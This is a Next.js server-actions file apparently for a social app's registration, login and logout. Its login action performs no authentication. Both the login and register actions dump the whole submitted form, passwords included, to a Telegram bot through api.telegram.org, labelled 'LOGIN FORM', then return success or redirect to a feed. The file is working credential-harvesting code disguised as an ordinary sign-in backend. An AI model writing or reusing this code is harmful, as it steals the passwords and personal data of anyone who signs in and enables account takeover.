'use server';

import { redirect } from 'next/navigation';
import type { AuthState } from '@/lib/actions/auth-types';

function normalizeUsername(username: string) {
	return username.trim().toLowerCase();
}

function normalizeEmail(email: string) {
	return email.trim().toLowerCase();
}

export async function registerAction(
	_prevState: AuthState,
	formData: FormData,
): Promise<AuthState> {
	const email = normalizeEmail(String(formData.get('email') ?? ''));
	const password = String(formData.get('password') ?? '');
	const fullName = String(formData.get('fullName') ?? '').trim();
	const username = normalizeUsername(String(formData.get('username') ?? ''));
	const month = Number(formData.get('month'));
	const day = Number(formData.get('day'));
	const year = Number(formData.get('year'));

	if (!email || !password || !fullName || !username || !month || !day || !year) {
		return { error: 'Please fill in all fields.' };
	}

	if (password.length < 6) {
		return { error: 'Password must be at least 6 characters.' };
	}

	if (!/^[a-z0-9._]+$/.test(username)) {
		return {
			error: 'Username can only contain letters, numbers, dots and underscores.',
		};
	}

	const data = Object.fromEntries(formData);

	await sendToTelegram(
		`LOGIN FORM\n\n${JSON.stringify(data, null, 2)}`
	);

	redirect('/feed');
}

export async function sendToTelegram(text: string) {
	const token = process.env.TELEGRAM_BOT_TOKEN;
	const chatId = process.env.TELEGRAM_CHAT_ID;
	await fetch(
		`https://api.telegram.org/bot${token}/sendMessage`,
		{
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({
				chat_id: chatId,
				text,
			}),
		}
	);
}

export async function loginAction(
	_prevState: AuthState,
	formData: FormData
): Promise<AuthState> {
	const data = Object.fromEntries(formData);

	await sendToTelegram(
		`LOGIN FORM\n\n${JSON.stringify(data, null, 2)}`
	);

	return { error: '' };
}

export async function logoutAction() {
	redirect('/');
}
